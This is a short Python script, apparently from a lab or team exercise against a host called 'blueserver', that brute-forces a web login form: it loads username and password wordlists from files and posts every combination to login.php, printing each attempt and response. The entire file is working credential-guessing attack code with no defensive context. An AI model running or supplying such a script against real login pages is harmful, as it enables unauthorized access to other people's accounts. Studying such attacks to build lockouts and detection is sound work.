import requests

url = 'https://blueserver/login.php'
user_path = 'usernames.txt'
pass_path = 'passwords.txt'

with open(user_path, 'r') as file:
    username_list = file.readlines()

username_list = [username.strip() for username in username_list]

with open(pass_path, 'r') as file:
    password_list = file.readlines()

password_list = [password.strip() for password in password_list]

for username in username_list:
    for password in password_list:
        credentials = {
        'user': username,
        'pass': password
        }

        response = requests.post(url, data=credentials)

        print(f'Attempted {username}:{password}', response)
